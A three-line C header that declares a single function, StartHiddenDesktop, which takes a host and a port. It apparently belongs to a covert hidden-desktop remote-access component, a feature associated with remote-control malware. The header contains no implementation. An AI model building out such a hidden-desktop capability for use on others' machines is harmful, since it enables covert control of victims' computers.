#pragma once
#include "../common/Common.h"
HANDLE StartHiddenDesktop(const char *host, int port);